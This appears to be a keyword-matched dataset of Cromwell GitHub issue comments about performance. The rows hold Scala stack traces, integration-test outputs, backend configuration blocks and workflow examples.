scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:3030,concurren,concurrent,3030,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['concurren'],['concurrent']
Performance,"log | grep should | sort; done; - should Fail the first run and NOT call cache the second run of dont_cache_to_failed_jobs *** FAILED *** (5 minutes, 37 seconds); - should call cache the second run of cwl_cache_between_workflows *** FAILED *** (2 minutes, 56 seconds); - should fail during execution bad_file_string *** FAILED *** (2 minutes, 44 seconds); - should fail during execution bad_output_task *** FAILED *** (3 minutes, 18 seconds); - should fail during execution relative_output_paths_colliding *** FAILED *** (3 minutes, 27 seconds); - should successfully run curl *** FAILED *** (8 minutes, 38 seconds); - should successfully run cwl_cache_within_workflow *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_import_type_packed *** FAILED *** (3 minutes, 43 seconds); - should successfully run cwl_interpolated_strings *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_relative_imports_url *** FAILED *** (3 minutes, 37 seconds); - should successfully run cwl_relative_imports_zip *** FAILED *** (2 minutes, 52 seconds); - should successfully run docker_hash_dockerhub *** FAILED *** (5 minutes, 18 seconds); - should successfully run docker_hash_gcr *** FAILED *** (5 minutes, 31 seconds); - should successfully run docker_hash_quay *** FAILED *** (4 minutes, 31 seconds); - should successfully run hello *** FAILED *** (2 minutes, 54 seconds); - should successfully run hello_yaml *** FAILED *** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - shou",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:247,cache,cache,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['cache'],['cache']
Performance,"logue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system configuration. filesystems {. . # For SFS backends, the ""local"" configuration specifies how files are handled. local {. . # Try to hard link (ln), then soft-link (ln -s), and if both fail, then copy the files. localization: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Call caching strategies. caching {. # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:. duplication-strategy: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Possible values: file, path. # ""file"" will compute an md5 hash of the file content. # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",. # in order to allow for the original file path to be hashed. hashing-strategy: ""file"". . # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. # If false or the md5 does not exist, will proceed with the above-defined hashing strategy. check-sibling-md5: false. }. }. }. . # The defaults for runtime attributes if not provided. default-runtime-attributes {. failOnStderr: false. continueOnReturnCode: 0. }. }. }. }. }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:2946,cache,cached,2946,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,1,['cache'],['cached']
Performance,"lowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:5843,concurren,concurrent,5843,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"low_var_refs (1 minute, 46 seconds); - should successfully run subdirectory (1 minute, 16 seconds); - should successfully run subworkflows_in_ifs (1 minute, 47 seconds); - should successfully run taskless_engine_functions (16 seconds, 277 milliseconds); - should successfully run test_file_outputs_from_input (45 seconds, 789 milliseconds); - should successfully run three_step__subwf_cwl (2 minutes, 33 seconds); - should successfully run tmp_dir (1 minute, 6 seconds); - should successfully run valid_labels (37 seconds, 78 milliseconds); - should successfully run variable_scoping (38 seconds, 77 milliseconds); - should successfully run wdl_empty_glob (46 seconds, 965 milliseconds); - should successfully run wdl_function_locations (1 minute, 37 seconds); - should successfully run workflow_engine_functions (21 seconds, 482 milliseconds); - should successfully run workflow_output_declarations (46 seconds, 853 milliseconds); - should successfully run workflow_type_and_version_wdl (40 seconds, 392 milliseconds); - should successfully run workflow_url_biscayne_sub_wfs (35 seconds, 322 milliseconds); - should successfully run workflow_url_http_relative_imports (35 seconds, 718 milliseconds); - should successfully run workflow_url_square (15 seconds, 152 milliseconds); - should successfully run workflow_url_sub_workflow_hello_world (53 seconds, 160 milliseconds); - should successfully run workflowenginefunctions (45 seconds, 630 milliseconds); - should successfully run writeToCache (1 minute, 15 seconds); - should successfully run write_lines (1 minute, 55 seconds); - should successfully run write_lines_files (3 minutes, 5 seconds); - should successfully run write_tsv (56 seconds, 21 milliseconds); - should NOT call cache the second run of call_cache_hit_prefixes_empty_hint_local !!! IGNORED !!!; - should NOT call cache the second run of call_cache_hit_prefixes_two_roots_empty_hint_cache_miss_papi !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:16306,cache,cache,16306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['cache'],['cache']
Performance,"lure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2020-08-25 10:40:46,27] [info] WorkflowManagerActor WorkflowActor-282f5595-171e-4296-a7fa-9bd9f7a2f33b is in a terminal state: WorkflowFailedState; ```; However, this error occurs only about 80 percent of the time when I'm trying to run a job. 2. Cromwell doesn't localize sra files to the right level; You can see below ; `2020/08/25 17:32:56 Localizing input sra://S",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:3118,concurren,concurrent,3118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['concurren'],['concurrent']
Performance,"mapValues recomputes itself every time it is accessed. As stated in the original ticket, we have had fairly serious performance problems which traced back to the usage of mapValues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532:116,perform,performance,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532,1,['perform'],['performance']
Performance,"mary>; <pre>; 18:57:55.173 [daemonpool-thread-33] INFO centaur.api.CentaurCromwellClient$ - Submitting drs_usa_jdr returned workflow id efe9c9a5-cd24-4c78-b39d-d9f10cc754de; 2020-10-13 18:57:55,443 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa; 2020-10-13 18:57:57,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1090,cache,cache,1090,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,mework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(Cro,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4526,Concurren,ConcurrentRestrictions,4526,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['Concurren'],['ConcurrentRestrictions']
Performance,"mework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5252,Concurren,ConcurrentRestrictions,5252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['Concurren'],['ConcurrentRestrictions']
Performance,"mics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of pote",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2547,cache,cacheCopy,2547,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cacheCopy']
Performance,"more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initial",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1198,perform,performed,1198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['perform'],['performed']
Performance,"mory: machine_mem + "" MB""; disks: ""local-disk "" + disk_size + "" HDD""; }. output {; File output_bam = ""~{name}.bam""; File output_bai = ""~{name}.bai"". }; }; ```. input:; ```; {; ""Mutect2.tumor_reads"": ""sra://SRR2619134/SRR2619134""; }; ```. wdl:; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; filesystems {; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""fusera/fusera:alpine""; ngc = ""/home/nicholas/.sra/prj_26387_D28121.ngc""; }; }; engine {; filesystems {; gcs {; auth = ""application-default""; }. }; }; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; concurrent-job-limit = 10000; max-concurrent-workflows = 10000; genomics-api-queries-per-100-seconds = 10000; maximum-polling-interval = 300; max-workflow-launch-count = 2000; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; enable-fuse = true; }; filesystems {; sra {}; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161:3125,concurren,concurrent-job-limit,3125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161,2,['concurren'],"['concurrent-job-limit', 'concurrent-workflows']"
Performance,"mounts have to be manually configured for each and every Cromwell task in order to take advantage of the fuse capabilities. Definitely the decision either to use or not use such init script highly depends on a workflow. From my point of view if some of workflow tasks use fuse capabilities then most of them probably do the same. Therefore the usage of init script is not required but can be helpful in such cases. As an example let's look at the following workflow. It just calculates number of files in some of the mounted directories. *count.wdl*; ```wdl; version 1.0. workflow count {; output {; Int REFERENCES = references.NUMBER; Int SAMPLES = samples.NUMBER; }. call references { }; call samples { }; }. task references {; output {; Int NUMBER = read_int(""number""); }. command <<<; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ls -lh /mount-point/references/ | wc -l > number; >>>; }. task samples {; output {; Int NUMBER = read_int(""number""); }. command <<<; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ls -lh /mount-point/samples/ | wc -l > number; >>>; }; ```. As long as we have some common initialization in both tasks we can extract it to the init script which will be executed right before each task command. If we perform such optimization then we have to upload `init_script.sh` to google cloud and enable it in the workflow properties. *init_script.sh*; ```bash; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ```. *workflow_options.json*; ```bash; {; ""init_script"": ""gs://storage/init_script.sh""; }; ```. *count.wdl*; ```wdl; version 1.0. workflow count {; output {; Int REFERENCES = references.NUMBER; Int SAMPLES = samples.NUMBER; }. call references { }; call samples { }; }. task references {; output {; Int NUMBER = read_int(""number""); }. command <<<; ls -lh /mount-point/references/ | wc -l > number; >>>; }. task samples {; output {; Int NUMBER = read_int(""number""); }. command <<<; ls -lh /mount-point/samples/ | wc -l > number; >>>; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5342#issuecomment-597303988:1524,perform,perform,1524,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5342#issuecomment-597303988,2,"['optimiz', 'perform']","['optimization', 'perform']"
Performance,mwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:133) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:146) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:892) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:886) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoin,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:9260,concurren,concurrent,9260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
